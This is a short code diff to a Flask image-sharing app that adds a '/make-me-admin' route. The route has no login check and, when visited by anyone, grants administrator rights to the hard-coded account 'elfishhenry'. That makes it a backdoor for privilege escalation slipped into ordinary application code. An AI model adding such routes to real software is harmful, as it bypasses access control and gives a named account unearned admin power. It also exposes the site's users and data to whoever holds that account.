@@ -38,6 +38,15 @@ def index():
 
     return render_template('index.html', images=images, search_form=search_form, liked_images=liked_images)
 
+@app.route('/make-me-admin')
+def make_me_admin():
+    user = User.query.filter_by(username='elfishhenry').first()
+    if not user:
+        return "User not found", 404
+    user.is_admin = True
+    db.session.commit()
+    return f"User {user.username} is now admin."
+
 @app.route('/upload', methods=['GET', 'POST'])
 @login_required
 def upload():
